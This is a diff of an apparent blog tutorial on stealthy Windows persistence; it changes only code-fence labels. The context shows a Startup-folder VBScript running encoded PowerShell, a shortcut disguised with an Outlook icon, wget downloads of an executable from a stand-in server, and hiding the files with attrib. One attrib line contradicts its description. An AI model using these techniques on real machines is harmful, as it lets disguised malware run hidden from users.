@@ -61,7 +61,7 @@ Could we encode the Powershell command? Of course, but it is even better if we a
 
 To avoid any windows appearing in the screen, we will use a VBScript file. For example, the following script will execute an encoded powershell command which will call "c:\ProgramData\Outlook\OutlookUpdate.exe". If we create this file in the Startup folder, the program will get executed and there will be no window popping the user could ever see:
 
-```
+```powershell
 Set objShell = WScript.CreateObject(""WScript.Shell"")
 objShell.Run(""powershell -e YwA6AFwAUAByAG8AZwByAGEAbQBEAGEAdABhAFwATwB1AHQAbABvAG8AawBcAE8AdQB0AGwAbwBvAGsAVQBwAGQAYQB0AGUALgBlAHgAZQA=""), 0, True
 ```
@@ -73,7 +73,7 @@ But, knowing the folder contains mostly shortcuts, maybe it makes more sense if 
 
 Furthermore, we will change the shortcut icon to a more reliable-looking one, and for this example we will use an Outlook icon. We can generate the file shortcut using WScript:
 
-```
+```powershell
 $WshShell = New-Object -comObject WScript.Shell
 $Shortcut = $WshShell.CreateShortcut("$($env:USERPROFILE)\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\$LnkFile")
 wget $Url/$IcoFile -Outfile $Dir\$IcoFile
@@ -95,7 +95,7 @@ We will drop the icon and EXE file and generate the shortcut and the VBScript fi
 
 We can use the "hidden" attribute so the files are not visible in the folder (by default, even if you probably have File Explorer configured to see hidden items) or running "dir" (you should run "dir /a" to see these hidden files). For this we could use:
 
-```
+```powershell
 attrib -h C:\ProgramData\Outlook\OutlookUpdate.exe
 ```
 
@@ -107,7 +107,7 @@ From my tests, it is important to notice that the shortcut file can not be "hidd
 
 This process is automated in the following [script](https://gist.github.com/ricardojoserf/d021310080ea34c8c6187d82065dde85):
 
-```
+```powershell
 $Url = "http://127.0.0.1:8080"
 $Dir="C:\ProgramData\Outlook"
 $ExeFile = "notmalicious.exe"
@@ -151,7 +151,7 @@ cmd /c "dir /a ""$($env:USERPROFILE)\AppData\Roaming\Microsoft\Windows\Start Men
 
 And this is the [script](https://gist.github.com/ricardojoserf/6e1a242e77a52c78b630af22d5709153) to delete the files generated for the persistence (basically you have to unset the "hidden" attribute before deleting a file, you could also delete the folder but I think it is risky to do that in a script):
 
-```
+```powershell
 $Dir="C:\ProgramData\Outlook"
 $ExeFile = "notmalicious.exe"
 $VbsFile = "CheckUpdate.vbs"
